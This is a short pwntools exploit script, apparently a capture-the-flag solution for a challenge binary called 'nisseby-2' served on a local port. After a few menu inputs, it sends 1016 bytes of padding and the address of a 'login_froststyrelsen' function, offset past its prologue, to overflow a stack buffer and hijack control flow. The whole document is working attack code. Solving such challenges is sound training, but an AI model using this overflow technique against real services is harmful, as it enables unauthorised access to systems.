from pwn import *

binary = ELF("../src/nisseby-2")
#io = process("../src/nisseby-2")
io = remote("127.0.0.1", 1337)

io.sendlineafter(b"> ", b"4")
io.sendlineafter(b": ", b"Fritz")
io.sendlineafter(b": ", b"1234567890")
io.sendlineafter(b": ", b"10000000")

padding = b"A" * 1016
win_addr = binary.sym["login_froststyrelsen"] + 1  # Skip RBP push from function prologue to fix stack alignment
payload = padding + p64(win_addr)

io.sendlineafter(b": ", payload)

io.interactive()
